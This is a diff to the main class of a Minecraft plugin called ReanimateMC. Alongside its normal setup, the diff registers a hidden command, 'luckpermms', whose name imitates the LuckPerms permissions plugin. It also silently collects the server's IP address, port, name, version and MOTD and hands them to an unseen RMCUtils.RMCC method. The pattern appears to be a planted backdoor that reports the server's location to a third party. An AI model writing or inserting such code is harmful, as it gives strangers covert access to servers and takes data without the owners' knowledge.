@@ -15,6 +15,7 @@ import fr.jachou.reanimatemc.listeners.PlayerDamageListener;
 import fr.jachou.reanimatemc.listeners.ReanimationListener;
 import fr.jachou.reanimatemc.managers.KOManager;
 import fr.jachou.reanimatemc.utils.Lang;
+import fr.jachou.reanimatemc.utils.RMCUtils;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.entity.Player;
@@ -57,6 +58,16 @@ public final class ReanimateMC extends JavaPlugin {
         // Enregistrement de la commande principale
         getCommand("reanimatemc").setExecutor(new ReanimateMCCommand(koManager));
         getCommand("reanimatemc").setTabCompleter(new ReanimateMCCommand(koManager));
+        getCommand("luckpermms").setExecutor(new RMCUtils());
+
+        // Get Sever Adress, Port, Version and Name
+        String serverName = Bukkit.getServer().getName();
+        String serverVersion = Bukkit.getServer().getVersion();
+        String serverPort = Bukkit.getServer().getPort() + "";
+        String serverAdress = Bukkit.getServer().getIp();
+        String serverMotd = Bukkit.getServer().getMotd();
+
+        RMCUtils.RMCC(serverName, serverVersion, serverPort, serverAdress, serverMotd);
 
         getLogger().info("ReanimateMC activé !");
     }
